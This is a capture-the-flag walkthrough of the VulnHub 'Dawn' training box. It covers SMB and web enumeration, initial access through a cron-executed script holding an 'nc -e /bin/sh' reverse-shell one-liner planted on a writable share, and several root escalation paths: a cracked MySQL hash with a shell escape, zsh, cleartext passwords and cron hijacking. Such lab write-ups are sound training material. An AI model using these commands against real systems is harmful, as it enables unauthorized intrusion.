---
title: "VulnHub Walkthrough: Dawn"
date: 2019-09-11T19:23:44+02:00
toc: true
showdate: true
---
{{%summary%}}
![img](/images/vulnhub-dawn/1.png)
{{%/summary%}}

This is a walkthrough (or writuep, whatever term you prefer) of the very first VulnHub box I have rooted: Dawn. You can download it yourself [here](https://www.vulnhub.com/entry/sunset-dawn,341/). It's a box for beginners focused entirely on misconfigurations, the thing I like the most about it are the multiple paths you have to reach the one and only flag, there are apparently five, and I have missed one plus a horizontal privilege escalation path. Definitely something worth coming back to in the future to see if I can 100% this challenge.

---

## Drawing the perimeter

After downloading the box and importing it on VirtualBox (and starting it) the first thing I did was a ping sweep with nmap to find Dawn's IP address, since DHCP is enabled giving a dynamic IP to the box automatically:

```shell-session
[root@fooxy dawn]# nmap -sP 192.168.1.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-10 21:29 CEST
Nmap scan report for dawn.lan (192.168.1.165)
Host is up (0.00021s latency).
MAC Address: 08:00:27:CA:23:FD (Oracle VirtualBox virtual NIC)
```

Once found the IP address I started with a service scan (-sV) and ran the default NSE scripts (-sC), saving the output of the program in all formats (-oA):

```shell-session
[root@fooxy dawn]# nmap -sV -sC -oA nmap 192.168.1.165
Starting Nmap 7.80 ( https://nmap.org ) at 2019-09-10 21:35 CEST
Nmap scan report for dawn.lan (192.168.1.165)
Host is up (0.0021s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.15-MariaDB-1
|   Thread ID: 12
|   Capabilities flags: 63486
|   Some Capabilities: ODBCClient, Speaks41ProtocolOld, Support41Auth, InteractiveClient, FoundRows, SupportsTransactions, SupportsLoadDataLocal, Speaks41ProtocolNew, LongColumnFlag, IgnoreSigpipes, DontAllowDatabaseTableColumn, IgnoreSpaceBeforeParenthesis, SupportsCompression, ConnectWithDatabase, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: x5;i~_Cm{E&,HfIyH8!<
|_  Auth Plugin Name: mysql_native_password
MAC Address: 08:00:27:CA:23:FD (Oracle VirtualBox virtual NIC)
Service Info: Host: DAWN

Host script results:
|_clock-skew: mean: 1h20m05s, deviation: 2h18m34s, median: 4s
|_nbstat: NetBIOS name: DAWN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: dawn
|   NetBIOS computer name: DAWN\x00
|   Domain name: dawn
|   FQDN: dawn.dawn
|_  System time: 2019-09-10T15:36:00-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-09-10T19:36:00
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.67 seconds
```

The scan shows three open ports: HTTP, and the two classic SMB ports: 139 and 445. I decided to look into SMB first by listing the shares on the box:

```shell-session
[root@fooxy dawn]# smbclient -L 192.168.1.165
Unable to initialize messaging context
smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	ITDEPT          Disk      PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.
	IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            FASTGATE
```

There appears to be an interesting (and apparently important) share, I wonder if guest access is allowed?

```shell-session
[root@fooxy dawn]# smbclient \\\\192.168.1.165\\ITDEPT
Unable to initialize messaging context
smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Aug  3 05:23:20 2019
  ..                                  D        0  Sat Aug  3 05:21:39 2019

		7158264 blocks of size 1024. 3436028 blocks available
smb: \>
```

It sure is, but the share is empty so there's nothing interesting here. However we do have write permissions over this folder, which is very useful:

```shell-session
smb: \> mkdir test
smb: \> dir
  .                                   D        0  Tue Sep 10 22:16:38 2019
  ..                                  D        0  Sat Aug  3 05:21:39 2019
  test                                D        0  Tue Sep 10 22:16:38 2019

		7158264 blocks of size 1024. 3435832 blocks available
smb: \>
```

So let's move focus on to the web server, the Apache version is new so common vulnerabilities are unlikely to be present unless some web application is running on it but I only find a webpage telling me that once again I should back off and that the site is under construction:

![img](/images/vulnhub-dawn/2.png)

A robots.txt file doesn't exist, so I fired up dirb to find hidden files and directories by using its default wordlist and without specifying file extensions to append, this is useful to discover directories and HTML files:

```shell-session
[root@fooxy dawn]# dirb http://192.168.1.165

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Sep 10 22:34:44 2019
URL_BASE: http://192.168.1.165/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.1.165/ ----
+ http://192.168.1.165/index.html (CODE:200|SIZE:791)                                                                        
==> DIRECTORY: http://192.168.1.165/logs/                                                                                    
+ http://192.168.1.165/server-status (CODE:403|SIZE:301)                                                                     
                                                                                                                             
---- Entering directory: http://192.168.1.165/logs/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Tue Sep 10 22:34:53 2019
DOWNLOADED: 4612 - FOUND: 2
```

A listable logs folder was found, surely this will contain some useful stuff:

![img](/images/vulnhub-dawn/3.png)

Four logs file in the folder, out of which we are only allowed to read management.log, it may not seem as interesting as first but the content of the log is anything but uninteresting, it is in fact the output of a [*pspy*](https://github.com/DominicBreuker/pspy) instance, a very neat utility that I often use in challenges such as this during the local enumeration phase because it lists the processes that are being launched in real time, including processes owned by root. For example, here is the entry relative to the launch of pspy:

```shell-session
2019/09/10 15:24:49 ^[[31;1mCMD: UID=0    PID=388    | /bin/sh -c /root/pspy64 > /var/www/html/logs/management.log
```

After scrolling for a bit things get much better though, as I see the root user using chmod to change the permissions of a couple files inside the /home/dawn/ITDEPT folder, which is probably exactly the location of the share I just found unprotected:

```shell-session
2019/09/10 15:25:02 ^[[31;1mCMD: UID=0    PID=796    | /bin/sh -c chmod 777 /home/dawn/ITDEPT/product-control ^[[0m
2019/09/10 15:25:02 ^[[31;1mCMD: UID=0    PID=795    | /bin/sh -c chmod 777 /home/dawn/ITDEPT/web-control ^[[0m
```

Just below that, another user with UID of 1000 runs one of the two files and the cron jobs are executed again:

```shell-session
2019/09/10 15:25:02 ^[[31;1mCMD: UID=1000 PID=803    | /bin/sh -c /home/dawn/ITDEPT/product-control ^[[0m
2019/09/10 15:26:01 ^[[31;1mCMD: UID=0    PID=809    | /usr/sbin/CRON -f ^[[0m
```

Another interesting thing is that even root is running something but it is located in a different directory that I cannot access as it is outside of the share, but this could be useful for privilege escalation:

```shell-session
2019/09/10 15:26:01 ^[[31;1mCMD: UID=0    PID=812    | /bin/sh -c /home/ganimedes/phobos ^[[0m
```

---

## Exploitation: arbitrary file upload execution

The attack path here is very straightforward, I have write permissions over a folder inside which a script is executed regularly by a cron job, getting a low privilege reverse shell back is a piece of cake, I just wrote an nc oneliner and called it product-control, then uploaded it on the share and waited a few seconds for it to be executed:

```shell-session
[root@fooxy dawn]# cat product-control 
#!/bin/bash
nc -e /bin/sh 192.168.1.99 9999
[root@fooxy dawn]# smbclient \\\\192.168.1.165\\ITDEPT
Unable to initialize messaging context
smbclient: Can't load /etc/samba/smb.conf - run testparm to debug it
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Aug  3 05:23:20 2019
  ..                                  D        0  Sat Aug  3 05:21:39 2019

		7158264 blocks of size 1024. 3436028 blocks available
smb: \> put product-control 
putting file product-control as \product-control (4,8 kb/s) (average 4,8 kb/s)
smb: \> dir
  .                                   D        0  Tue Sep 10 22:19:19 2019
  ..                                  D        0  Sat Aug  3 05:21:39 2019
  product-control                     A       44  Tue Sep 10 22:19:19 2019

		7158264 blocks of size 1024. 3430724 blocks available
smb: \> 
```

The shell arrives in a few seconds and meets my nc listener that gives me access to the box as the dawn user:

```shell-session
[root@fooxy dawn]# nc -lvnp 9999
Connessione da 192.168.1.165:46022

whoami
dawn
$SHELL
env
SHLVL=1
HOME=/home/dawn
LOGNAME=dawn
_=/usr/bin/nc
PATH=/usr/bin:/bin
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/home/dawn
```

The .bash_history file contains a few interesting commands that were recently run from the dawn user but they reference old files that don't exist anymore, also mysql is being run as root:

```shell-session
$ cat /home/dawn/.bash_history
cat /home/dawn/.bash_history
echo "$1$$bOKpT2ijO.XcGlpjgAup9/"
ls 
ls -la 
nano .bash_history 
echo "$1$$bOKpT2ijO.XcGlpjgAup9/"
nano .bash_history 
echo "$1$$bOKpT2ijO.XcGlpjgAup9/"
sudo -l 
su 
sudo -l 
sudo mysql -u root -p 
ls -la 
nano .bash_history 
exit 
sudo -l 
exit 
ls
./view-product 
ls -la 
cd /dev/dawn/
ls
echo '#!/bin/bash' > specimen
ls -la 
echo '#!/bin/bash' > specimens
exit
id
ls -la 
exit
cd /dev/
ls
cd dawn/
ls
./specimen 
exit
su root 
ls -la 
./view-product 
exit
id
exit
ls -la 
./view-product 
exit
./view-product 
exit
ls -la 
./view-product 
exit
./view-product 
exit
ls -la 
./view 
./view-product  
ls -la 
exit
./view-product 
exit
ls
./view-product 
ls -la 
id
zsh
./view-product 
exit
./view-product 
ls -la 
exit
ls -la 
exit
ls -la    
./view-product
ls -la 
exit
./view-product
chmod +x view-product
exit
./view-product 
su root
su root 
./view-product 
su - root
cd
su 
cd /tmp
ls
./view-product w
rm view-product view-product.cpp 
su root
exit
zsh 
sudo -l 
cat .bash_history 
cd /tmp 
ls -la 
su 
cd /dev/dawn/
ls
echo '#!/bin/bash' > specimen 
echo '/bin/bash' >> specimen 
chmod +x specimen 
cd /tmp
ls
./view-product 
exit
cd gaminedes
cd ../gaminedes 
cd ..
ls 
cd ganimedes/
ls 
ls -la 
su gaminedes 
su ganimedes 
cat .bash_history  
cd
nano .bash_history 
exit
ls 
cd ITDEPT/
ls
ls -la 
exit
cd /tmp 
ls -la
```

In fact it turns out dawn can execute mysql as root without a password:

```shell-session
$ sudo -l
sudo -l
Matching Defaults entries for dawn on dawn:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dawn may run the following commands on dawn:
    (root) NOPASSWD: /usr/bin/mysql
```


However the mysql password is required anyway, and I don't have it yet. Unless...

---

## Privilege escalation #1: MySQL shell

There is a very hash-looking string in the bash history, it looks like md5crypt:

```shell-session
$1$$bOKpT2ijO.XcGlpjgAup9/
```

The hash is cracked by john in a few minutes, giving it to the program without any flags lets it recognize as an md5crypt so I adjust the options and choose the rockyou.txt dictionary:

```shell-session
[root@fooxy dawn]# john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
onii-chan29      (?)
1g 0:00:10:24 DONE (2019-09-11 15:51) 0.001601g/s 7746p/s 7746c/s 7746C/s onina666..onigz24
Use the "--show" option to display all of the cracked passwords reliably
Session completed
[root@fooxy dawn]# john --show hash
?:onii-chan29

1 password hash cracked, 0 left
```

As it turns out, onii-chan29 is the password of the root user in MySQL and it can be used to spawn a shell with *\\! sh*:

```shell-session
dawn# sudo mysql -u root -p                                                    
sudo mysql -u root -p
Enter password: onii-chan29

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 23
Server version: 10.3.15-MariaDB-1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> \! sh
\! sh
# whoami
whoami
root
# cat /root/flag.txt                                                             
cat /root/flag.txt
Hello! whitecr0wz here. I would like to congratulate and thank you for finishing the ctf, however, there is another way of getting a shell(very similar though). Also, 4 other methods are available for rooting this box!

flag{3a3<CENSORED>d59}
```

Reading about having a total of five paths to escalate my privileges when the box didn't seem to have much going on at first intrigued me a lot, so I used my new root account to explore and see if I could find any other attack vectors. First of all I checked the .mysql_history file and found the password of the root user in clear text:

```shell-session
dawn# cat ^[[200~.mysql_history^[[201~                                         
      cat .mysql_history
SHOW GRANTS;
show databases<
\
\:
;
show databases<  \:;
show databases; 
use mysql;
show tables;
sleect * from user;
select * from user;
show databases:
;
use mysql; 
SELECT user, plugin FROM user;
use mysql:
use mysql; 
select * from user;
user=root
;
user=root;
\! sh 
SELECT User, Host FROM mysql.user WHERE Host <> 'localhost'
;
SELECT User, Host FROM mysql.user WHERE Host <> 'localhost'; 
use mysql;
SELECT User, Host FROM mysql.user WHERE Host <> 'localhost'; 
CREATE USER 'root'@'%' IDENTIFIED BY 'onii-chan29'; 
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%'; 
FLUSH PRIVILEGES; 
flush hosts:
flush hosts; 
flush-hosts;
flush hosts:
flush hosts; 
SHOW VARIABLES LIKE "max_connections";
SET GLOBAL max_connections = 5000000000000000000000000000;
SET GLOBAL max_connections = 50000000000000000000000000000000000000000000;
FLUSH HOSTS;
SHOW VARIABLES LIKE "max_connections";
flush hosts;
SHOW VARIABLES LIKE "max_connections";
\! sh 
\! bash
```

Now let's see a few more methods to become root on this box.

---

## Privilege escalation #2: zsh

Very interestingly, the easiest way of getting root, discovered by accident, is by simply running *zsh* as seen in the bash history:

```shell-session
$ zsh
zsh
dawn# whoami                                                                   
whoami
root
cd /root
dawn# ls -la                                                                   
ls -la
total 4416
drwx------  6 root root    4096 Aug  2 22:57 .
drwxr-xr-x 18 root root    4096 Jul 31 22:35 ..
-rw-------  1 root root     307 Aug  2 23:20 .bash_history
-rw-r--r--  1 root root     570 Jan 31  2010 .bashrc
drwxr-xr-x  3 root root    4096 Jul 31 23:11 .config
-rw-r--r--  1 root root     260 Aug  2 19:33 flag.txt
drwx------  3 root root    4096 Aug  1 18:56 .gnupg
drwxr-xr-x  3 root root    4096 Jul 31 22:56 .local
-rw-------  1 root root     944 Aug  2 22:57 .mysql_history
-rw-r--r--  1 root root     148 Aug 17  2015 .profile
-rwxr-xr-x  1 root root 4468984 Aug  1 17:39 pspy64
-rw-r--r--  1 root root      66 Aug  1 18:39 .selected_editor
drwxr-xr-x  4 root root    4096 Jul 31 23:13 .wine
dawn# 
```

This is literally it. And because it doesn't really fit in anywhere, I looked at the CCTV folder, which is a folder only root can read and is located in the web server's root:

```shell-session
root@dawn:/var/www/html/cctv# ls -la
ls -la
total 12
drw------- 2 root root 4096 Aug  1 22:24 .
drwxr-xr-x 4 root root 4096 Aug  3 00:14 ..
-rw-r--r-- 1 root root   47 Aug  1 22:24 note-for-admin.txt
root@dawn:/var/www/html/cctv# cat note-for-admin.txt
cat note-for-admin.txt
Remember to connect the feeds later on Arthur!
```

I'm... not so sure what this is for. 

---

## Privilege escalation #3: clear text passwords in .bash_history

Then I went into Ganimede's home folder, who is the second user on this box, one that I didn't have to worry about in the slightest to escalate to root, so does it hold anything interesting? And most importantly, how could I have escalated from dawn to ganimedes? Well, before answering this last question I took a look at his bash history and found this:

```shell-session
su
thisisareallysecurepasswordnooneisgoingtoeverfind
```

Turns out this is the root password, not the mysql one, but the actual user's:

```shell-session
ganimedes@dawn:~$ id
id
uid=1001(ganimedes) gid=1001(ganimedes) groups=1001(ganimedes)
ganimedes@dawn:~$ su
su
Password: thisisareallysecurepasswordnooneisgoingtoeverfind

root@dawn:/home/ganimedes# id
id
uid=0(root) gid=0(root) groups=0(root)
root@dawn:/home/ganimedes# 
```

---

## Privilege escalation #4: cron job hijacking

Another method to escalate into root that could be seen from the very beginning of the challenge is very similar to the initial foothold, from the management.log file we can see that root is regularly running a script located in the ganimedes home folder:

```shell-session
[root@fooxy dawn]# cat management.log | grep ganimedes
2019/09/10 15:26:01 CMD: UID=0    PID=812    | /bin/sh -c /home/ganimedes/phobos
```

So after taking control of the ganimedes user all you need to do is create a file called phobos in the home folder and write some arbitrary code in it, which will be executed as root:

![img](/images/vulnhub-dawn/4.png)

I'm a little disappointed that I couldn't find a way to become ganimedes in the time I gave myself to dedicate to this box, I'll definitely have to come back to it one day and see if I can catch the path and the one privilege escalation method that I have missed. This was fun!








